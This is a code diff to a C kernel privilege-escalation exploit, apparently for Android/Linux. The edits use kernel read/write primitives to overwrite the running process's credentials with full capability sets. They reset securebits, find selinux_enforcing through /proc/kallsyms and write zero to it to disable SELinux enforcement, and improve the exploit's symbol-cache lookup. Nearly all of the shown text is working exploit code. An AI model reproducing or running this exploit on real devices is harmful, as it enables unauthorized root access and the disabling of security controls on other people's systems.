@@ -23,9 +23,9 @@
 //#define OFFSET__task_struct__seccomp 0x9b0 
 //#define OFFSET__cred__user_ns 0x088 // if you define this, the first run might be a little faster
 //#define OFFSET__task_struct__cred 0x550
-//#define OFFSET__cred__security 0x078
-//#define OFFSET__cred__cap_inheritable 0x028
-//#define OFFSET__cred__cap_ambient 0x048
+#define OFFSET__cred__security 0x078
+#define OFFSET__cred__cap_inheritable 0x028
+#define OFFSET__cred__cap_ambient 0x048
 //#define OFFSET__task_struct__mm 0x308
 
 
@@ -499,6 +499,12 @@ unsigned long kernel_read_ulong(unsigned long kaddr)
     kernel_read(kaddr, &data, sizeof(data));
     return data;
 }
+unsigned long kernel_read_uint(unsigned long kaddr)
+{
+    unsigned int data;
+    kernel_read(kaddr, &data, sizeof(data));
+    return data;
+}
 void kernel_write_ulong(unsigned long kaddr, unsigned long data)
 {
     kernel_write(kaddr, &data, sizeof(data));
@@ -617,43 +623,45 @@ unsigned long findSymbol(char* execName, unsigned long pointInKernelMemory, char
     strcat(pathname, ".symbol");
     
     if (buf[0] == 0 || strncmp(buf, "0000000000000000", 16) == 0) {
-        FILE *cached = fopen(pathname, "r");
         unsigned long address = 0;
-        fscanf(cached, "%lx", &address);
-        fclose(cached);
+        puts("c");
+        FILE *cached = fopen(pathname, "r");
+        if (cached != NULL) {
+            fscanf(cached, "%lx", &address);
+            fclose(cached);
+        }
         if (address != 0) {
             message("MAIN: read address %lx from cache", address);
             return address;
         }
-        if (fixKallsymsFormatStrings(pointInKernelMemory))
+        if (fixKallsymsFormatStrings(pointInKernelMemory) == 0)
         {
             error( "Cannnot fix kallsyms format string");
         }
     }
+
     ks = fopen("/proc/kallsyms", "r");
-    unsigned l = strlen(symbol);
-    while (NULL != fgets(buf, 1024, ks))
+    while (NULL != fgets(buf, 1024, ks)) 
     {
-        char *p = buf + 17;
-        while (isspace(*p))
-            p++;
-        p++;
-        while (isspace(*p))
-            p++;
-        if (!strncmp(p, symbol, l) && p[l] == '\x0A')
+        unsigned long address;
+        unsigned char type;
+        char sym[512];
+        sscanf(buf, "%lx %c %s", &address, &type, sym);
+        if (!strcmp(sym, symbol)) // && p[l] == '\x0A')
         {
-            unsigned long address;
-            sscanf(buf, "%lx", &address);
-            fclose(ks);
             FILE *cached = fopen(pathname, "w");
-            fprintf(cached, "%lx\n", address);
-            fclose(cached);
-            char* cmd = alloca(10+strlen(pathname)+1);
-            sprintf(cmd, "chmod 666 %s", pathname);
-            system(cmd);
+            if (cached != NULL) {
+                fprintf(cached, "%lx\n", address);
+                fclose(cached);
+                char* cmd = alloca(10+strlen(pathname)+1);
+                sprintf(cmd, "chmod 666 %s", pathname);
+                system(cmd);
+            }
+            fclose(ks);
             return address;
         }
     }
+
     fclose(ks);
     return 0;
 }
@@ -750,6 +758,19 @@ int main(int argc, char **argv)
     
     unsigned long cred_ptr = kernel_read_ulong(task_struct_ptr + offset_task_struct__cred);
 
+#ifdef OFFSET__cred__user_ns    
+    unsigned long search_base = kernel_read_ulong(cred_ptr + OFFSET__cred__user_ns);
+    if (search_base < 0xffffffc000000000ul || search_base >= 0xffffffd000000000ul)
+        search_base = 0xffffffc001744b70ul;
+#else
+#define search_base 0xffffffc000000000ul
+#endif
+
+    message("MAIN: search_base = %lx", search_base);
+    message("MAIN: searching for selinux_enforcing");
+    unsigned long selinux_enforcing = findSymbol(argv[0], search_base, "selinux_enforcing");
+//    unsigned long selinux_enabled = findSymbol(argv[0], search_base, "selinux_enabled");
+
     message("MAIN: setting root credentials with cred offset %lx", offset_task_struct__cred);
     
     for (int i = 0; i < 8; i++)
@@ -765,11 +786,11 @@ int main(int argc, char **argv)
     // reset securebits
     kernel_write_uint(cred_ptr + OFFSET__cred__securebits, 0);
 
-    //kernel_write_ulong(cred_ptr+OFFSET__cred__cap_inheritable, 0x3fffffffffUL);
+    kernel_write_ulong(cred_ptr+OFFSET__cred__cap_inheritable, 0x3fffffffffUL);
     kernel_write_ulong(cred_ptr + OFFSET__cred__cap_permitted, 0x3fffffffffUL);
     kernel_write_ulong(cred_ptr + OFFSET__cred__cap_effective, 0x3fffffffffUL);
     kernel_write_ulong(cred_ptr + OFFSET__cred__cap_bset, 0x3fffffffffUL);
-    //kernel_write_ulong(cred_ptr+OFFSET__cred__cap_ambient, 0x3fffffffffUL);
+    kernel_write_ulong(cred_ptr+OFFSET__cred__cap_ambient, 0x3fffffffffUL);
 
     int seccompStatus = prctl(PR_GET_SECCOMP);
     message("MAIN: SECCOMP status %d", seccompStatus);
@@ -789,26 +810,20 @@ int main(int argc, char **argv)
         }
     }
 
-#ifdef OFFSET__cred__user_ns    
-    unsigned long search_base = kernel_read_ulong(cred_ptr + OFFSET__cred__user_ns);
-    if (search_base < 0xffffffc000000000ul || search_base >= 0xffffffd000000000ul)
-        search_base = 0xffffffc001744b70ul;
-#else
-#define search_base 0xffffffc000000000ul
-#endif
 
-    message("MAIN: search_base = %lx", search_base);
-
-    message("MAIN: searching for selinux_enforcing");
-
-    unsigned long selinux_enforcing = findSymbol(argv[0], search_base, "selinux_enforcing");
     if (selinux_enforcing == 0)
         message("MAIN: **FAIL** cannot find selinux_enforcing symbol");
     else
     {
-        message("MAIN: found selinux_enforcing at %lx", selinux_enforcing);
         kernel_write_uint(selinux_enforcing, 0);
         message("MAIN: disabled selinux enforcing");
+        
+/* process hangs if these are done */        
+/*        unsigned long security_ptr = kernel_read_ulong(cred_ptr + OFFSET__cred__security);
+        kernel_write_uint(security_ptr, 1);
+        kernel_write_uint(security_ptr+4, 1);
+        for (int i=0; i<6; i++)
+            message("SID %u : ", kernel_read_uint(security_ptr + 4 * i));  */
     }
 
     if (argc == 2)
